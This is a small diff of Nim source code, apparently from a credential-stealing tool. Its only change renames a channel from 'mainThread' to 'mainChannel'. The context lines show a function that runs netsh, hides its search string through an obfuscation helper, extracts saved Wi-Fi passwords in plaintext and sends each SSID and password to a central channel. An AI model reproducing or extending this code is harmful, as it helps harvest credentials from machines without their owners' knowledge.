@@ -5,7 +5,7 @@ from strutils import contains
 
 from osproc import execProcess
 
-from ../channels import mainThread
+from ../channels import mainChannel
 
 import ../functions/hideString
 
@@ -24,7 +24,7 @@ proc getWifiPasswords(): void =
       for line in netshOutout2.split("\n"):
         if line.contains(d e"Key Content"):
           let password: string = line.split(": ")[1]
-          mainThread.send SSID & ": " & password
+          mainChannel.send SSID & ": " & password
 
 proc initWifiPasswordsThread*(): void {.thread.} =
   getWifiPasswords()
